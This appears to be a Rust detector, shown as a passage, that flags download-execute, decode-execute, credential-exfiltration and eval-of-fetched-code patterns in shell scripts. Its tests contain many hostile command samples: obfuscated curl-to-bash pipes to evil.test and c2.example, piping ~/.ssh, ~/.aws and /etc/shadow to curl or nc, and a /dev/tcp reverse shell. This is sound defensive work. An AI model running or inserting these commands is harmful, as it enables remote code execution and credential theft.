            '\\' if i + 1 < chars.len() => {
                output.push(ch);
                output.push(chars[i + 1]);
                i += 2;
            }
            '\'' | '"' => {
                let mut end = i + 1;
                let mut inner = String::new();
                let mut closed = false;
                while end < chars.len() {
                    let current = chars[end];
                    if current == ch {
                        closed = true;
                        break;
                    }
                    if ch == '"' && current == '\\' && end + 1 < chars.len() {
                        inner.push(chars[end + 1]);
                        end += 2;
                        continue;
                    }
                    inner.push(current);
                    end += 1;
                }
                if !closed {
                    output.extend(&chars[i..]);
                    break;
                }
                let joinable = !inner.chars().any(|current| {
                    current.is_whitespace()
                        || matches!(current, '|' | ';' | '&' | '<' | '>' | '(' | ')')
                });
                if joinable {
                    output.push_str(&inner);
                } else {
                    output.extend(&chars[i..=end]);
                }
                i = end + 1;
            }
            _ => {
                output.push(ch);
                i += 1;
            }
        }
    }

    output
}

// --- Pipeline composition -------------------------------------------------

/// A cross-stage behaviour that no single literal pattern can see.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CompositionKind {
    /// Downloader output reaches an interpreter through intermediate stages,
    /// a privilege wrapper, or an interpreter the literal patterns omit.
    DownloadExecute,
    /// Encoded data is decoded straight into an interpreter.
    DecodeExecute,
    /// Credential material is read by, or flows into, a network sender.
    CredentialExfiltration,
    /// `eval`, `sh -c`, an interpreter here-string, or an interpreter
    /// process-substitution runs a command substitution that downloads or
    /// decodes.
    SubstitutionExecute,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Composition {
    pub kind: CompositionKind,
    /// Stage names joined with `|`, for the report.
    pub chain: String,
    /// 1-based line in the analysed content.
    pub line: usize,
}

const SUBSTITUTION_PLACEHOLDER: &str = "__BEWAUR_SUBST_";
const DOWNLOADERS: &[&str] = &["curl", "wget"];
const NETWORK_SENDERS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "netcat", "socat", "telnet", "scp",
];

static CREDENTIAL_PATH_RE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
    regex::Regex::new(
        r"(?:^|[/~=@:])\.(?:ssh|aws|kube|gnupg|azure|password-store)(?:/|$)|(?:^|[/~=@:])\.docker/config\.json|(?:^|[/~=@:])\.config/gcloud(?:/|$)|(?:^|[/~=@:])\.(?:netrc|git-credentials)$|^/etc/g?shadow$",
    )
    .unwrap()
});

struct Substitution {
    body: String,
    start_line: usize,
    /// `<(...)` / `>(...)` rather than `$(...)` / backticks.
    process: bool,
}

/// Find download/decode-to-interpreter chains, credential exfiltration, and
/// executed command substitutions. Pipelines are followed across any number
/// of stages and into `$(...)`, backticks, process substitutions, literal
/// `sh -c` / `eval` strings, and heredocs that feed an interpreter. At most one
/// finding is returned per kind.
///
pub fn find_compositions(content: &str) -> Vec<Composition> {
    let mut findings = Vec::new();
    find_compositions_inner(content, 0, 0, &mut findings);
    let mut seen = std::collections::HashSet::new();
    findings.retain(|finding| seen.insert(finding.kind));
    findings
}

fn find_compositions_inner(
    content: &str,
    depth: usize,
    line_offset: usize,
    findings: &mut Vec<Composition>,
) {
    if depth > 6 {
        return;
    }

    let (active, heredoc_bodies, expanding_heredocs) = extract_heredoc_parts(content);
    let (flattened, substitutions) = extract_substitutions(&active);
    let tokens = tokenize(&flattened);

    // `cat <<EOF` (unquoted) still runs the `$(...)` in its body.
    for body in &expanding_heredocs {
        let (_, nested) = extract_substitutions(&body.content);
        for substitution in nested {
            find_compositions_inner(
                &substitution.body,
                depth + 1,
                line_offset
                    + body.start_line.saturating_sub(1)
                    + substitution.start_line.saturating_sub(1),
                findings,
            );
        }
    }

    for pipeline in split_tokens(&tokens, |token| matches!(token, Token::Separator)) {
        analyze_pipeline(pipeline, line_offset, findings);
    }

    for (start, end) in command_spans(&tokens) {
        let span = &tokens[start..end];
        let Some(command) = executable(span) else {
            continue;
        };
        if let Some(chain) = executed_substitution(&command, span, &substitutions, depth) {
            findings.push(Composition {
                kind: CompositionKind::SubstitutionExecute,
                chain,
                line: line_offset + command.executable.line,
            });
        }
        if let Some(script) = literal_shell_source(&command) {
            find_compositions_inner(
                &script,
                depth + 1,
                line_offset + command.executable.line.saturating_sub(1),
                findings,
            );
        }
    }

    for substitution in substitutions {
        find_compositions_inner(
            &substitution.body,
            depth + 1,
            line_offset + substitution.start_line.saturating_sub(1),
            findings,
        );
    }

    for body in heredoc_bodies {
        find_compositions_inner(
            &body.content,
            depth + 1,
            line_offset + body.start_line.saturating_sub(1),
            findings,
        );
    }
}

fn split_tokens(tokens: &[Token], is_boundary: impl Fn(&Token) -> bool) -> Vec<&[Token]> {
    let mut parts = Vec::new();
    let mut start = 0;
    for (index, token) in tokens.iter().enumerate() {
        if is_boundary(token) {
            if start < index {
                parts.push(&tokens[start..index]);
            }
            start = index + 1;
        }
    }
    if start < tokens.len() {
        parts.push(&tokens[start..]);
    }
    parts
}

struct Stage {
    command: Option<ResolvedCommand>,
    stdin_overridden: bool,
    stdout_overridden: bool,
    mentions_credential: bool,
}

impl Stage {
    fn name(&self) -> Option<String> {
        self.command
            .as_ref()
            .map(|command| command_name(&command.executable).to_ascii_lowercase())
    }

    fn label(&self) -> String {
        self.name().unwrap_or_else(|| "?".to_string())
    }

    fn line(&self) -> usize {
        self.command
            .as_ref()
            .map_or(1, |command| command.executable.line)
    }

    fn is_downloader(&self) -> bool {
        self.name()
            .is_some_and(|name| DOWNLOADERS.contains(&name.as_str()))
    }

    fn is_interpreter(&self) -> bool {
        self.command
            .as_ref()
            .is_some_and(interpreter_consumes_stdin)
    }

    fn is_encoding_decoder(&self) -> bool {
        self.command.as_ref().is_some_and(is_encoding_decoder)
    }

    fn is_sender(&self) -> bool {
        let Some(command) = &self.command else {
            return false;
        };
        let name = command_name(&command.executable).to_ascii_lowercase();
        if NETWORK_SENDERS.contains(&name.as_str()) {
            return true;
        }
        name == "xargs"
            && command.args.iter().any(|argument| {
                NETWORK_SENDERS.contains(&command_name(argument).to_ascii_lowercase().as_str())
            })
    }
}

fn build_stage(tokens: &[Token]) -> Stage {
    let parsed = parse_command(tokens);
    let command = executable(tokens);
    let mentions_credential = tokens.iter().any(
        |token| matches!(token, Token::Word(word) if CREDENTIAL_PATH_RE.is_match(&word.value)),
    );
    Stage {
        command,
        stdin_overridden: parsed.stdin_overridden,
        stdout_overridden: parsed.stdout_overridden,
        mentions_credential,
    }
}

fn analyze_pipeline(pipeline: &[Token], line_offset: usize, findings: &mut Vec<Composition>) {
    let stages: Vec<Stage> = split_tokens(pipeline, |token| matches!(token, Token::Pipe))
        .into_iter()
        .map(build_stage)
        .collect();

    // Split where a redirection breaks the data flow between two stages.
    let mut segment_start = 0;
    for index in 0..stages.len() {
        let breaks_after = index + 1 == stages.len()
            || stages[index].stdout_overridden
            || stages[index + 1].stdin_overridden;
        if breaks_after {
            analyze_segment(&stages[segment_start..=index], line_offset, findings);
            segment_start = index + 1;
        }
    }
}

fn chain_label(stages: &[Stage]) -> String {
    stages
        .iter()
        .map(Stage::label)
        .collect::<Vec<_>>()
        .join("|")
}

fn analyze_segment(stages: &[Stage], line_offset: usize, findings: &mut Vec<Composition>) {
    if let Some(downloader) = stages.iter().position(Stage::is_downloader)
        && let Some(relative) = stages[downloader + 1..]
            .iter()
            .position(Stage::is_interpreter)
    {
        let interpreter = downloader + 1 + relative;
        // Plain `curl | bash` also fires P-CURL-PIPE; the duplicate row is
        // deliberate, because the regex misses `|&`, quoted `|` in URLs, and
        // multi-line pipelines that the tokenizer handles.
        findings.push(Composition {
            kind: CompositionKind::DownloadExecute,
            chain: chain_label(&stages[downloader..=interpreter]),
            line: line_offset + stages[downloader].line(),
        });
    } else if let Some(decoder) = stages.iter().position(Stage::is_encoding_decoder)
        && let Some(relative) = stages[decoder + 1..].iter().position(Stage::is_interpreter)
    {
        let interpreter = decoder + 1 + relative;
        findings.push(Composition {
            kind: CompositionKind::DecodeExecute,
            chain: chain_label(&stages[decoder..=interpreter]),
            line: line_offset + stages[decoder].line(),
        });
    }

    if let Some(reader) = stages.iter().position(|stage| stage.mentions_credential)
        && let Some(relative) = stages[reader..].iter().position(Stage::is_sender)
    {
        let sender = reader + relative;
        findings.push(Composition {
            kind: CompositionKind::CredentialExfiltration,
            chain: chain_label(&stages[reader..=sender]),
            line: line_offset + stages[reader].line(),
        });
    }
}

fn is_encoding_decoder(command: &ResolvedCommand) -> bool {
    let name = command_name(&command.executable).to_ascii_lowercase();
    let short_flag = |flag: char| {
        command.args.iter().any(|argument| {
            let value = argument.value.as_str();
            value.len() > 1
                && value.starts_with('-')
                && !value.starts_with("--")
                && value[1..].contains(flag)
        })
    };
    let long_flag = |flag: &str| command.args.iter().any(|argument| argument.value == flag);
    match name.as_str() {
        "base64" | "base32" | "basenc" => {
            short_flag('d') || short_flag('D') || long_flag("--decode")
        }
        "xxd" => short_flag('r') || long_flag("-revert"),
        "openssl" => long_flag("-d"),
        "uudecode" => true,
        _ => false,
    }
}

/// `eval "$(…)"`, `sh -c "$(…)"`, `bash <<< "$(…)"`, `bash <(…)` and
/// `source <(…)` where the substitution downloads or decodes.
fn executed_substitution(
    command: &ResolvedCommand,
    span: &[Token],
    substitutions: &[Substitution],
    depth: usize,
) -> Option<String> {
    let name = command_name(&command.executable).to_ascii_lowercase();
    let fetching = |text: &str, process_only: bool| {
        placeholder_indices(text).into_iter().any(|index| {
            substitutions.get(index).is_some_and(|substitution| {
                (!process_only || substitution.process)
                    && fetches_or_decodes(&substitution.body, depth + 1)
            })
        })
    };
    let shell = SHELL_INTERPRETERS.contains(&name.as_str());
    let interpreter = shell || SCRIPT_INTERPRETERS.contains(&name.as_str());

    if name == "eval"
        && command
            .args
            .iter()
            .any(|argument| fetching(&argument.value, false))
    {
        return Some(format!("{name} $(…)"));
    }

    if shell {
        for (index, argument) in command.args.iter().enumerate() {
            let value = argument.value.as_str();
            if !value.starts_with('-') {
                break;
            }
            if (value == "--command" || !value.starts_with("--") && value[1..].contains('c'))
                && command
                    .args
                    .get(index + 1)
                    .is_some_and(|script| fetching(&script.value, false))
            {
                return Some(format!("{name} -c $(…)"));
            }
        }
    }

    if interpreter || matches!(name.as_str(), "source" | ".") {
        // Here-string or process substitution supplying the program.
        let mut here_string = false;
        for token in span {
            match token {
                Token::Redirection(redirection)
                    if redirection.fd == 0
                        && matches!(redirection.kind, RedirectionKind::HereString) =>
                {
                    here_string = true;
                }
                Token::Word(word) if here_string => {
                    if interpreter && fetching(&word.value, false) {
                        return Some(format!("{name} <<< $(…)"));
                    }
                    here_string = false;
                }
                Token::Redirection(redirection)
                    if redirection.fd == 0
                        && matches!(redirection.kind, RedirectionKind::Input) =>
                {
                    // `bash < <(curl …)`
                    if let Some(Token::Word(word)) = span
                        .iter()
                        .skip_while(|candidate| !std::ptr::eq(*candidate, token))
                        .nth(1)
                        && interpreter
                        && fetching(&word.value, true)
                    {
                        return Some(format!("{name} < <(…)"));
                    }
                }
                _ => {}
            }
        }
        if let Some(operand) = command
            .args
            .iter()
            .find(|argument| !argument.value.starts_with('-'))
            && fetching(&operand.value, true)
        {
            return Some(format!("{name} <(…)"));
        }
    }

    None
}

fn placeholder_indices(text: &str) -> Vec<usize> {
    let mut indices = Vec::new();
    let mut rest = text;
    while let Some(position) = rest.find(SUBSTITUTION_PLACEHOLDER) {
        rest = &rest[position + SUBSTITUTION_PLACEHOLDER.len()..];
        let digits: String = rest.chars().take_while(char::is_ascii_digit).collect();
        if let Ok(index) = digits.parse() {
            indices.push(index);
        }
        rest = &rest[digits.len()..];
    }
    indices
}

/// Whether executing this command-substitution body downloads or decodes.
fn fetches_or_decodes(content: &str, depth: usize) -> bool {
    if depth > 6 {
        return false;
    }
    let (active, heredoc_bodies) = extract_heredoc_bodies(content);
    let (flattened, substitutions) = extract_substitutions(&active);
    let tokens = tokenize(&flattened);
    for (start, end) in command_spans(&tokens) {
        let Some(command) = executable(&tokens[start..end]) else {
            continue;
        };
        let name = command_name(&command.executable).to_ascii_lowercase();
        if DOWNLOADERS.contains(&name.as_str()) || is_encoding_decoder(&command) {
            return true;
        }
        if let Some(script) = literal_shell_source(&command)
            && fetches_or_decodes(&script, depth + 1)
        {
            return true;
        }
    }
    substitutions
        .iter()
        .any(|substitution| fetches_or_decodes(&substitution.body, depth + 1))
        || heredoc_bodies
            .iter()
            .any(|body| fetches_or_decodes(&body.content, depth + 1))
}

/// Replace top-level `$(…)`, backtick, `<(…)` and `>(…)` substitutions with
/// numbered placeholder words and return their bodies. Single-quoted text and
/// comments are inert; substitutions inside double quotes are live. `$((…))`
/// arithmetic is copied through unchanged. Newlines inside a substitution are
/// re-emitted after its placeholder so the outer line count is preserved.
fn extract_substitutions(content: &str) -> (String, Vec<Substitution>) {
    let chars: Vec<char> = content.chars().collect();
    let mut output = String::with_capacity(content.len());
    let mut substitutions = Vec::new();
    let mut in_double = false;
    let mut at_word_start = true;
    let mut line = 1usize;
    let mut i = 0usize;

    let emit = |output: &mut String,
                substitutions: &mut Vec<Substitution>,
                body: &[char],
                start_line: usize,
                process: bool| {
        let body: String = body.iter().collect();
        let newlines = body.matches('\n').count();
        output.push_str(&format!(
            "{SUBSTITUTION_PLACEHOLDER}{}__",
            substitutions.len()
        ));
        substitutions.push(Substitution {
            body,
            start_line,
            process,
        });
        for _ in 0..newlines {
            output.push('\n');
        }
        newlines
    };

    while i < chars.len() {
        let ch = chars[i];
        let next = chars.get(i + 1).copied();

        if ch == '\\' && next.is_some() {
            output.push(ch);
            output.push(chars[i + 1]);
            if next == Some('\n') {
                line += 1;
            }
            at_word_start = false;
            i += 2;
            continue;
        }

        if !in_double {
            if ch == '\'' {
                let end = chars[i + 1..]
                    .iter()
                    .position(|candidate| *candidate == '\'')
                    .map_or(chars.len() - 1, |offset| i + 1 + offset);
                for &quoted in &chars[i..=end] {
                    if quoted == '\n' {
                        line += 1;
                    }
                    output.push(quoted);
                }
                at_word_start = false;
                i = end + 1;
                continue;
            }
            if ch == '#' && at_word_start {
                while i < chars.len() && chars[i] != '\n' {
                    output.push(chars[i]);
                    i += 1;
                }
                continue;
            }
        }

        if ch == '"' {
            in_double = !in_double;
        }

        let opens_command = ch == '$' && next == Some('(') && chars.get(i + 2) != Some(&'(');
        let opens_process = !in_double && matches!(ch, '<' | '>') && next == Some('(');
        if (opens_command || opens_process)
            && let Some(close) = find_substitution_end(&chars, i + 2)
        {
            line += emit(
                &mut output,
                &mut substitutions,
                &chars[i + 2..close],
                line,
                opens_process,
            );
            at_word_start = false;
            i = close + 1;
            continue;
        }
        if ch == '$' && next == Some('(') && chars.get(i + 2) == Some(&'(') {
            // Arithmetic expansion: copy through the matching `))`.
            if let Some(close) = find_substitution_end(&chars, i + 2) {
                for &arithmetic in &chars[i..=close] {
                    if arithmetic == '\n' {
                        line += 1;
                    }
                    output.push(arithmetic);
                }
                i = close + 1;
                continue;
            }
        }
        if ch == '`'
            && let Some(close) = find_backtick_end(&chars, i + 1)
        {
            line += emit(
                &mut output,
                &mut substitutions,
                &chars[i + 1..close],
                line,
                false,
            );
            at_word_start = false;
            i = close + 1;
            continue;
        }

        if ch == '\n' {
            line += 1;
        }
        at_word_start = ch.is_whitespace() || matches!(ch, ';' | '|' | '&' | '(' | ')');
        output.push(ch);
        i += 1;
    }

    (output, substitutions)
}

/// Index of the `)` closing a substitution whose body starts at `start`.
fn find_substitution_end(chars: &[char], start: usize) -> Option<usize> {
    let mut depth = 1usize;
    let mut quote: Option<char> = None;
    let mut at_word_start = true;
    let mut i = start;

    while i < chars.len() {
        let ch = chars[i];
        match quote {
            Some('\'') => {
                if ch == '\'' {
                    quote = None;
                }
            }
            Some(_) => match ch {
                '\\' => i += 1,
                '"' => quote = None,
                '$' if chars.get(i + 1) == Some(&'(') => {
                    i = find_substitution_end(chars, i + 2)?;
                }
                '`' => i = find_backtick_end(chars, i + 1)?,
                _ => {}
            },
            None => match ch {
                '\\' => i += 1,
                '\'' | '"' => quote = Some(ch),
                '#' if at_word_start => {
                    while i + 1 < chars.len() && chars[i + 1] != '\n' {
                        i += 1;
                    }
                }
                '`' => i = find_backtick_end(chars, i + 1)?,
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(i);
                    }
                }
                _ => {}
            },
        }
        at_word_start =
            quote.is_none() && (ch.is_whitespace() || matches!(ch, ';' | '|' | '&' | '(' | ')'));
        i += 1;
    }
    None
}

fn find_backtick_end(chars: &[char], start: usize) -> Option<usize> {
    let mut i = start;
    while i < chars.len() {
        match chars[i] {
            '\\' => i += 1,
            '`' => return Some(i),
            _ => {}
        }
        i += 1;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reconstructs_adjacent_quoted_command_fragments() {
        let finding = find_obfuscated_download_execute(
            r#"build() { /usr/bin/cu""rl https://evil.test/p | ba''sh; }"#,
        )
        .unwrap();
        assert_eq!(finding.downloader, "curl");
        assert_eq!(finding.executor, "bash");
    }

    #[test]
    fn reconstructs_pipeline_across_newline() {
        let finding =
            find_obfuscated_download_execute("cu\"\"rl https://evil.test/p |\n  ba''sh").unwrap();
        assert_eq!(finding.line, 1);
    }

    #[test]
    fn skips_value_taking_wrapper_options() {
        for content in [
            "env -u HOME cu\"\"rl https://evil.test/p | ba''sh",
            "sudo -u nobody cu\"\"rl https://evil.test/p | ba''sh",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
    }

    #[test]
    fn handles_executing_sudo_and_literal_env_split_options() {
        for content in [
            "sudo -i cu\"\"rl https://evil.test/p | ba''sh",
            "sudo -b cu\"\"rl https://evil.test/p | ba''sh",
            "sudo -D /tmp cu\"\"rl https://evil.test/p | ba''sh",
            "sudo --chdir /tmp cu\"\"rl https://evil.test/p | ba''sh",
            "env -S 'curl https://evil.test/p' | ba''sh",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
    }

    #[test]
    fn rejects_nonexecuting_builtin_and_lookup_modes() {
        for content in [
            "builtin cu\"\"rl https://evil.test/p | ba''sh",
            "command -v harmless cu\"\"rl https://evil.test/p | ba''sh",
            "command -V harmless cu\"\"rl https://evil.test/p | ba''sh",
            "sudo -l cu\"\"rl https://evil.test/p | ba''sh",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_none(),
                "{content}"
            );
        }
    }

    #[test]
    fn recursively_analyzes_literal_shell_and_eval_strings() {
        for content in [
            "sh -c 'cu\"\"rl https://evil.test/p | bash'",
            "eval 'cu\"\"rl https://evil.test/p | bash'",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
        assert!(
            find_obfuscated_download_execute("sh -c \"$runtime_script\"").is_none(),
            "dynamic strings must remain unanalyzed rather than guessed"
        );
    }

    #[test]
    fn analyzes_only_heredocs_with_an_executing_sink() {
        for content in [
            "sh <<'EOF'\ncu\"\"rl https://evil.test/p | ba''sh\nEOF",
            "cat <<'EOF' | sh\ncu\"\"rl https://evil.test/p | ba''sh\nEOF",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
        for content in [
            "cat <<'EOF'\ncu\"\"rl https://evil.test/p | ba''sh\nEOF",
            "cat > /tmp/example <<'EOF'\ncu\"\"rl https://evil.test/p | ba''sh\nEOF",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_none(),
                "{content}"
            );
        }
    }

    #[test]
    fn honors_redirections_that_override_pipeline_endpoints() {
        for content in [
            "cu\"\"rl https://evil.test/p > /tmp/payload | ba''sh",
            "cu\"\"rl https://evil.test/p | ba''sh < /dev/null",
            "cu\"\"rl https://evil.test/p | ba''sh <<< 'echo benign'",
            "cu\"\"rl https://evil.test/p | ba''sh -c 'echo benign'",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_none(),
                "{content}"
            );
        }
        for content in [
            "cu\"\"rl https://evil.test/p 2>/dev/null | ba''sh",
            "cu\"\"rl https://evil.test/p | ba''sh > /tmp/log",
        ] {
            assert!(
                find_obfuscated_download_execute(content).is_some(),
                "{content}"
            );
        }
    }

    #[test]
    fn single_background_operator_ends_the_downloader_command() {
        assert!(
            find_obfuscated_download_execute("cu\"\"rl https://evil.test/p & printf safe | ba''sh")
                .is_none()
        );
        assert!(
            find_obfuscated_download_execute(
                "value=$((1 << 2))\ncu\"\"rl https://evil.test/p | ba''sh"
            )
            .is_some()
        );
    }

    #[test]
    fn quoted_prose_is_not_a_pipeline() {
        assert!(find_obfuscated_download_execute(r#"echo "cu\"\"rl x | ba''sh""#).is_none());
        assert!(find_obfuscated_download_execute("# cu\"\"rl x | ba''sh").is_none());
    }

    #[test]
    fn ordinary_pipeline_is_left_to_pattern_analysis() {
        assert!(find_obfuscated_download_execute("curl https://evil.test/p | bash").is_none());
    }

    #[test]
    fn pipe_stderr_operator_is_still_a_pipeline() {
        assert!(
            find_obfuscated_download_execute("cu\"\"rl https://evil.test/p |& ba''sh").is_some()
        );
    }

    #[test]
    fn noclobber_redirection_is_not_a_pipeline() {
        assert!(find_obfuscated_download_execute("cu\"\"rl >| ba''sh").is_none());
    }

    #[test]
    fn strips_only_real_shell_comments() {
        let input =
            "# base64 -d in documentation\necho '# base64 -d'\necho foo#bar\necho ok # base64 -d\n";
        let stripped = strip_comments(input);
        assert_eq!(stripped, "\necho '# base64 -d'\necho foo#bar\necho ok \n");
    }

    #[test]
    fn carries_quote_state_across_physical_lines() {
        let input =
            "echo \"documentation # still quoted\ncontinued\"; npm install js-digest # comment\n";
        assert_eq!(
            strip_comments(input),
            "echo \"documentation # still quoted\ncontinued\"; npm install js-digest \n"
        );
    }

    #[test]
    fn parameter_length_hash_is_not_treated_as_a_comment() {
        let input = "value=${#value}; python -c 'print(1)'\n{ # real comment\nfoo{#literal-word\n";
        assert_eq!(
            strip_comments(input),
            "value=${#value}; python -c 'print(1)'\n{ \nfoo{#literal-word\n"
        );
    }

    fn kinds(content: &str) -> Vec<CompositionKind> {
        find_compositions(content)
            .into_iter()
            .map(|finding| finding.kind)
            .collect()
    }

    #[test]
    fn download_execute_crosses_intermediate_stages() {
        for content in [
            "curl -s https://c2.example/p | base64 -d | bash",
            "wget -qO- https://c2.example/p | gunzip | sh",
            "curl -s u | tr a-z n-za-m | python3",
            "curl -s u | sudo bash",
            "curl -s u | zsh",
            "curl -s u | base64 -d | bash -s -- --flag",
            "curl -s u | base64 -d | sh -e",
            "curl -s u | base64 -d | bash --norc",
            "curl -s u |\n  base64 -d |\n  bash",
            "cu\"\"rl -s u | base64 -d | ba''sh",
            "x=$(curl -s u | base64 -d | bash)",
            "x=\"$(curl -s u | base64 -d | bash)\"",
            "x=`curl -s u | base64 -d | bash`",
            "bash -c 'curl -s u | base64 -d | sh'",
            "bash <<EOF\ncurl -s u | base64 -d | sh\nEOF",
        ] {
            assert!(
                kinds(content).contains(&CompositionKind::DownloadExecute),
                "missed: {content}"
            );
        }
    }

    #[test]
    fn plain_and_regex_evading_download_pipes() {
        for content in [
            "curl -s https://x | bash",
            "wget -qO- https://x | sh",
            "curl -s u |& bash",
            "curl -s \"https://x/?a|b\" | bash",
        ] {
            assert_eq!(
                kinds(content),
                vec![CompositionKind::DownloadExecute],
                "{content}"
            );
        }
    }

    #[test]
    fn interpreter_option_values_are_not_script_operands() {
        for interpreter in [
            "bash -euo pipefail",
            "bash -o pipefail",
            "bash +x",
            "bash -O extglob",
            "python3 -E",
            "python3 -W ignore",
            "python3 -Wignore",
            "perl -Mstrict",
            "perl -w",
            "ruby -E utf-8",
            "node -r ./hook.js",
            "bash /dev/fd/0",
            "bash -- /dev/stdin",
            "source /dev/stdin",
            ". /dev/stdin",
            "nice bash",
            "nice -n 10 bash",
            "timeout 60 sh",
            "timeout -s KILL 60 sh",
            "setsid bash",
            "busybox sh",
            "stdbuf -oL bash",
            "ionice -c3 bash",
        ] {
            let content = format!("curl -s u | base64 -d | {interpreter}");
            assert!(
                kinds(&content).contains(&CompositionKind::DownloadExecute),
                "missed: {content}"
            );
        }
        for interpreter in [
            "bash -ec 'cat > x'",
            "bash -o pipefail -c 'cat > x'",
            "python3 -W ignore -c 'import sys'",
            "perl -Mstrict -e 'print <STDIN>'",
            "ruby -E utf-8 -e 'p 1'",
            "php -r 'echo 1;'",
            "bash ./configure.sh",
            "source ./env.sh",
            "timeout 60 sha256sum",
        ] {
            let content = format!("curl -s u | base64 -d | {interpreter}");
            assert!(
                !kinds(&content).contains(&CompositionKind::DownloadExecute),
                "false positive: {content}"
            );
        }
    }

    #[test]
    fn unquoted_heredoc_bodies_expand_substitutions() {
        assert!(
            kinds("cat <<EOF\n$(curl -s u | base64 -d | bash)\nEOF")
                .contains(&CompositionKind::DownloadExecute)
        );
        assert!(kinds("cat <<'EOF'\n$(curl -s u | base64 -d | bash)\nEOF").is_empty());
        assert!(kinds("cat <<\\EOF\n$(curl -s u | base64 -d | bash)\nEOF").is_empty());
    }

    #[test]
    fn download_pipelines_without_stdin_interpreter_are_not_compositions() {
        for content in [
            "curl -s https://api.example/releases | awk '{print $4}'",
            "curl -s https://api.example/releases | jq -r .tag_name",
            "curl -sL https://x/a.tar.gz | tar xz",
            "curl -s https://x | python -c 'import json,sys; print(json.load(sys.stdin))'",
            "curl -s https://x | python3 -m json.tool",
            "curl -s https://x | node -e 'process.stdin.pipe(process.stdout)'",
            "curl -s https://x | sha256sum",
            "curl -s https://x > script.sh; bash -n script.sh",
            "echo 'curl -s u | base64 -d | bash'",
            "# curl -s u | base64 -d | bash",
            "cat > notes <<EOF\ncurl -s u | base64 -d | bash\nEOF",
            "x='$(curl -s u | base64 -d | bash)'",
            "pkgver() { curl -s u | base64 -d > out; bash out.sh; }",
            "base64 -d payload.b64 > icon.png",
            "echo $((1 + 2)) | bash -c 'read x; echo $x'",
        ] {
            assert!(
                kinds(content).is_empty(),
                "false positive: {content} -> {:?}",
                kinds(content)
            );
        }
    }

    #[test]
    fn decode_execute_requires_an_encoding_decoder() {
        assert_eq!(
            kinds("echo aGVsbG8K | base64 -d | sh"),
            vec![CompositionKind::DecodeExecute]
        );
        assert_eq!(
            kinds("base64 --decode <<< \"$blob\" | bash"),
            vec![CompositionKind::DecodeExecute]
        );
        assert_eq!(
            kinds("xxd -r -p data.hex | bash"),
            vec![CompositionKind::DecodeExecute]
        );
        assert!(kinds("zcat completion.gz | sed s/x/y/").is_empty());
    }

    #[test]
    fn credential_exfiltration_through_pipes_and_xargs() {
        for content in [
            "tar czf - /root/.ssh /root/.aws 2>/dev/null | base64 -w0 | xargs -I{} curl -s -d {} https://c2.example/collect || true",
            "cat ~/.ssh/id_rsa | curl -X POST -d @- https://c2.example",
            "x=$(cat ~/.aws/credentials | curl -d @- https://c2.example)",
            "curl -F \"f=@$HOME/.aws/credentials\" https://c2.example",
            "curl -d @- https://c2.example < ~/.kube/config",
            "cat /etc/shadow | nc c2.example 4444",
        ] {
            assert!(
                kinds(content).contains(&CompositionKind::CredentialExfiltration),
                "missed: {content}"
            );
        }
        assert!(kinds("install -Dm600 ssh_config \"$pkgdir/etc/ssh/ssh_config\"").is_empty());
        assert!(kinds("cat ~/.ssh/config | grep Host").is_empty());
    }

    #[test]
    fn executed_substitutions_that_fetch_or_decode() {
        for content in [
            "eval \"$(curl -fsSL https://c2.example/stage1)\"",
            "eval `wget -qO- https://c2.example`",
            "eval \"$(echo aGk= | base64 -d)\"",
            "bash -c \"$(curl -fsSL https://c2.example)\"",
            "sh <<< \"$(curl -s https://c2.example)\"",
            "bash <(curl -s https://c2.example)",
            "bash < <(curl -s https://c2.example)",
            "source <(curl -s https://c2.example | base64 -d)",
        ] {
            assert!(
                kinds(content).contains(&CompositionKind::SubstitutionExecute),
                "missed: {content}"
            );
        }
        for content in [
            "eval \"$pkgver\"",
            "eval \"$(dircolors -b)\"",
            "x=\"$(curl -s https://api/version)\"",
            "source <(./configure --print-env)",
        ] {
            assert!(
                !kinds(content).contains(&CompositionKind::SubstitutionExecute),
                "false positive: {content}"
            );
        }
    }

    #[test]
    fn braces_attached_to_words_are_not_separators() {
        let tokens = tokenize("xargs -I{} curl -d {} ${HOME}/x");
        assert!(!tokens.iter().any(|token| matches!(token, Token::Separator)));
        let grouped = tokenize("true; { echo a; }");
        assert!(!grouped.iter().any(
            |token| matches!(token, Token::Word(word) if word.value == "{" || word.value == "}")
        ));
    }

    #[test]
    fn joins_only_prose_free_quote_fragments() {
        assert_eq!(
            join_quoted_fragments("ba\"\"sh -i >& /dev/t''cp/1.2.3.4/4444 0>&1"),
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
        );
        assert_eq!(
            join_quoted_fragments("n\"\"c -e /bin/sh h 1"),
            "nc -e /bin/sh h 1"
        );
        assert_eq!(join_quoted_fragments("c\\url x"), "curl x");
        assert_eq!(
            join_quoted_fragments("echo \"run curl x | sh\""),
            "echo \"run curl x | sh\""
        );
        let multi = "a=\"x\ny\"\nb";
        assert_eq!(
            join_quoted_fragments(multi).lines().count(),
            multi.lines().count()
        );
    }
}
